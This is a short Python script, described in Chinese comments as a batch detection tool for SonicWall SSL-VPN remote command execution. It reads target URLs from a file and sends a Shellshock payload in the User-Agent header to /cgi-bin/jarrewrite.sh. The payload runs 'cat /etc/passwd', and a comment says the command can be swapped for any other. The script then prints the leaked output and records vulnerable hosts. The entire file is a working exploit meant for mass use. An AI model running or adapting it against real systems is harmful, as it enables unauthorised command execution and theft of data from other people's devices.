#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

"""
@Author  :   luodameinv
@Version :   1.0
@about:一个比较简单的SonicWallSSL-VPN远程命令执行批量检测工具
"""

import requests
from requests.packages import urllib3

print("将需要检测的url放入同一目录下的url.txt中执行,python3 SonicWallSSL-VPN_RCE.py") 

urllib3.disable_warnings()
headers = {
    'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'   #执行的命令可以在脚本中自定义，例如cat /etc/passwd
}


def exploit(url):
    url = url + "/cgi-bin/jarrewrite.sh"
    req = requests.get(url, verify=False, headers=headers, timeout=8)
    result = req.text
    if "root" in result:
        print("[*]" + url + " is success!")
        print(result)
        with open('success.txt', 'a') as f1:   #检测结果输出到success.txt,每次检测完，需删掉success.txt，才可开始下次的检测
            f1.write(url + '\n')
    else:
        pass


if __name__ == '__main__':
    num = 1
    with open('url.txt', 'r') as f:    
        lines = f.readlines()
        for line in lines:
            num += 1
            url = line.strip()
            print(f'Now,the number is:  {num}')
            try:
                exploit(url)
            except:
                pass
    print("[*]Exploit Finished")
